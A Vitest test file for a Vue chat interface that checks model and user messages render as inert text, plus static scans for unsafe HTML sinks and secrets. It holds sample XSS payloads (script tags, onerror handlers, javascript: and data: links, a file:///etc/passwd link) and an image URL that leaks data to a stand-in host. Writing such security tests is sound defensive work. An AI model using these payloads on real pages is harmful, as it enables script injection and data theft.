import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join, resolve } from 'node:path'

import { describe, expect, it } from 'vitest'
import { mount } from '@vue/test-utils'

import MessageContent from '../src/components/MessageContent.vue'
import MessageBubble from '../src/components/MessageBubble.vue'

const NL = String.fromCharCode(10)

const SRC = resolve(process.cwd(), 'src')

function walk(dir) {
  return readdirSync(dir).flatMap((entry) => {
    const full = join(dir, entry)
    if (statSync(full).isDirectory()) return walk(full)
    return /\.(js|vue)$/.test(entry) ? [full] : []
  })
}

const PAYLOADS = [
  '<script>window.__pwned = 1</script>',
  '<img src="x" onerror="window.__pwned = 1" />',
  '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><h1>injected</h1></body></foreignObject></svg>',
  '<a href="javascript:window.__pwned=1">click</a>',
  '"><input autofocus onfocus="window.__pwned=1">',
  '{{ 7 * 7 }}',
  '<iframe src="https://evil.test"></iframe>',
  '<object data="https://evil.test"></object><embed src="x">',
  '<form action="https://evil.test"><button formaction="javascript:window.__pwned=1">go</button></form>',
  '<style>body{display:none}</style>',
  '<base href="https://evil.test">',
  '<meta http-equiv="refresh" content="0;url=https://evil.test">',
]

/**
 * Link syntax is different from raw markup: `[label](javascript:…)` is a real
 * markdown construct, so refusing it means "show the label, create no anchor",
 * not "show the brackets". Both outcomes are safe; only the second one is a lie
 * about what the model wrote, so the two groups are asserted apart.
 */
const LINK_PAYLOADS = [
  '[click](javascript:window.__pwned=1)',
  '[click](JaVaScRiPt:window.__pwned=1)',
  '[click](java\tscript:window.__pwned=1)',
  '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[click](vbscript:msgbox)',
  '[click](file:///etc/passwd)',
  '[click](&#106;avascript:window.__pwned=1)',
]

/**
 * The elements this app is willing to create, written out here rather than
 * imported: a guard that reads its own allowance from the code under test widens
 * the moment the code does, which is the opposite of a guard. If a tag is added to
 * `ALLOWED_MARKDOWN_TAGS` on purpose, this list is where that decision gets
 * argued about a second time.
 */
const ALLOWED_ELEMENTS = new Set([
  'div',
  'span',
  'p',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'ul',
  'ol',
  'li',
  'blockquote',
  'pre',
  'code',
  'hr',
  'br',
  'strong',
  'em',
  'del',
  'a',
  'table',
  'thead',
  'tbody',
  'tr',
  'th',
  'td',
])

/** No answer, however formatted, ever needs these on a rendered node. */
const FORBIDDEN_ATTRIBUTES = new Set(['src', 'srcset', 'style', 'formaction', 'form', 'target'])

function inspectRendered(wrapper, payload) {
  for (const node of wrapper.findAll('*')) {
    const tag = node.element.tagName.toLowerCase()
    if (!ALLOWED_ELEMENTS.has(tag)) {
      throw new Error(`payload produced a live element: <${tag}> from ${payload}`)
    }
    for (const name of node.element.getAttributeNames()) {
      const value = node.element.getAttribute(name) ?? ''
      if (/^on/i.test(name)) {
        throw new Error(`payload produced an event handler attribute: ${name}`)
      }
      if (FORBIDDEN_ATTRIBUTES.has(name)) {
        throw new Error(`payload produced a live ${name} attribute: ${value}`)
      }
      if (name === 'href' || name === 'action' || name === 'xlink:href') {
        if (/^\s*(javascript|data|vbscript|file):/i.test(value)) {
          throw new Error(`payload produced a live ${name}="${value}"`)
        }
      }
    }
  }
}

function mountText(text, props = {}) {
  const wrapper = mount(MessageContent, { props: { text, ...props } })
  inspectRendered(wrapper, text)
  return wrapper
}

describe('rendering model output as formatted text', () => {
  it.each(PAYLOADS)('renders %s without creating elements or executing it', (payload) => {
    delete window.__pwned
    const wrapper = mountText(payload)

    // The literal characters survive; the markup does not become a node.
    expect(wrapper.text()).toBe(payload)
    expect(wrapper.html()).not.toContain('<script')
    expect(wrapper.html()).not.toContain('<iframe')
    expect(wrapper.html()).not.toContain('<img')
    expect(wrapper.html()).not.toContain('<style')
    expect(window.__pwned).toBeUndefined()
  })

  it.each(LINK_PAYLOADS)('gives %s no clickable target', (payload) => {
    delete window.__pwned
    const wrapper = mountText(payload)

    // Either no anchor at all, or one whose href this app would refuse anyway.
    for (const anchor of wrapper.findAll('a')) {
      throw new Error(`unsafe link survived as an anchor: ${anchor.html()}`)
    }
    expect(wrapper.text()).toContain('click')
    expect(window.__pwned).toBeUndefined()
  })

  it('never embeds a remote image, not even in correct syntax', () => {
    delete window.__pwned
    const wrapper = mountText('![证据](https://evil.test/leak.png?u=me)' + NL + NL + '正文')

    // An `img` is a request to a third party with the reader's own network, and a
    // load-failure handler waiting to fire. The alt text is all of it that shows.
    expect(wrapper.find('img').exists()).toBe(false)
    expect(wrapper.text()).toContain('证据')
    expect(wrapper.text()).not.toContain('evil.test')
  })

  it('escapes angle brackets in the serialized markup', () => {
    const wrapper = mountText('<b>bold</b>')
    expect(wrapper.text()).toBe('<b>bold</b>')
    expect(wrapper.find('b').exists()).toBe(false)
  })

  it('does not interpolate Vue template syntax in the message body', () => {
    const wrapper = mountText('{{ 7 * 7 }}')
    expect(wrapper.text()).toBe('{{ 7 * 7 }}')
    expect(wrapper.text()).not.toContain('49')
  })

  it('keeps user turns safe through the bubble as well', () => {
    delete window.__pwned
    const wrapper = mount(MessageBubble, {
      props: {
        message: {
          id: 'm1',
          role: 'user',
          content: '<img src=x onerror="window.__pwned=1">',
          status: 'done',
          error: null,
        },
      },
    })
    expect(wrapper.find('img').exists()).toBe(false)
    expect(window.__pwned).toBeUndefined()
  })

  it('renders an error card without treating the server message as markup', () => {
    const wrapper = mount(MessageBubble, {
      props: {
        message: {
          id: 'm2',
          role: 'assistant',
          content: '',
          status: 'error',
          error: { code: 'model_timeout', message: '<b>timeout</b>' },
        },
      },
    })
    expect(wrapper.find('b').exists()).toBe(false)
    expect(wrapper.text()).toContain('<b>timeout</b>')
    expect(wrapper.text()).toContain('model_timeout')
  })
})

describe('static guards over src/', () => {
  const files = walk(SRC)

  it('finds the components it is about to scan', () => {
    expect(files.length).toBeGreaterThan(10)
  })

  it.each(files.map((file) => [file]))('%s has no v-html directive', (file) => {
    const source = readFileSync(file, 'utf8')
    expect(source).not.toMatch(/v-html/)
  })

  it.each(files.map((file) => [file]))('%s has no direct innerHTML sink', (file) => {
    const source = readFileSync(file, 'utf8')
    expect(source).not.toMatch(/\.(innerHTML|outerHTML)\s*=/)
    expect(source).not.toMatch(/insertAdjacentHTML|createContextualFragment/)
  })

  it('contains no eval or non-literal timer sinks', () => {
    for (const file of files) {
      const source = readFileSync(file, 'utf8')
      expect(source).not.toMatch(/\beval\s*\(/)
      expect(source).not.toMatch(/new Function\s*\(/)
    }
  })

  it('never puts a credential into a URL', () => {
    for (const file of files) {
      const source = readFileSync(file, 'utf8')
      expect(source).not.toMatch(/[?&](token|access_token|authorization)=/)
    }
  })

  it('commits no secret literals', () => {
    for (const file of files) {
      const source = readFileSync(file, 'utf8')
      expect(source).not.toMatch(/(api[_-]?key|secret|password)\s*[:=]\s*['"][^'"]{8,}['"]/i)
    }
  })
})
